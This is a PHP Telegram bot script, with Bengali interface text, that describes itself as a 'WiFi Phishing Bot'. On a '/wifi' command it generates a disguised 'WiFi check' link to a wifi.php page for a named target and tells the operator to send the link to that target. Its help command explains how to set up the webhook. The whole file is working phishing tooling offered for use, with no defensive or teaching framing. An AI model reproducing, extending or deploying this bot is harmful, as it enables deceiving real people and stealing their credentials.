<?php
$BOT_TOKEN = $_ENV['BOT_TOKEN'] ?? $_SERVER['BOT_TOKEN'] ?? '';
$CHAT_ID = $_ENV['CHAT_ID'] ?? $_SERVER['CHAT_ID'] ?? '';

$telegram_api = "https://api.telegram.org/bot$BOT_TOKEN/";
$update = json_decode(file_get_contents('php://input'), true);

if (!$update) exit;

$message = $update['message'] ?? null;
$chat_id = $message['chat']['id'] ?? $CHAT_ID;
$text = $message['text'] ?? '';

if (preg_match('/^\/wifi\s+(.+)/i', $text, $matches)) {
    $target_name = htmlspecialchars($matches[1]);
    $domain = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . 
              '://' . $_SERVER['HTTP_HOST'];
    $phish_url = "$domain/wifi.php?target=" . urlencode($target_name);
    
    $keyboard = json_encode([
        'inline_keyboard' => [[
            ['text' => "🔗 $target_name WiFi চেক করুন", 'url' => $phish_url]
        ], [
            ['text' => "📱 লিঙ্ক শেয়ার", 'switch_inline_query' => "WiFi: $target_name"]
        ]]
    ]);
    
    $send_message = [
        'chat_id' => $chat_id,
        'text' => "🎯 **Phishing Link তৈরি হয়েছে!**\n\n" .
                  "👤 Target: *$target_name*\n" .
                  "🔗 Link: $phish_url\n\n" .
                  "📲 এই লিঙ্কটি target কে পাঠান!",
        'reply_markup' => $keyboard,
        'parse_mode' => 'Markdown'
    ];
    
    file_get_contents($telegram_api . 'sendMessage?' . http_build_query($send_message));
} elseif (stripos($text, '/start') === 0) {
    $help_text = "🔥 **WiFi Phishing Bot**\n\n" .
                 "📋 **কমান্ড:**\n" .
                 "`/wifi TARGETNAME` - phishing link তৈরি\n\n" .
                 "✅ **Deploy URL:** " . ((isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST']) . "\n" .
                 "🔗 **Webhook সেট:** https://api.telegram.org/bot$BOT_TOKEN/setWebhook?url=" . 
                 urlencode(((isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . '/bot.php'));
    
    file_get_contents($telegram_api . 'sendMessage?' . http_build_query([
        'chat_id' => $chat_id,
        'text' => $help_text,
        'parse_mode' => 'Markdown'
    ]));
}
?>
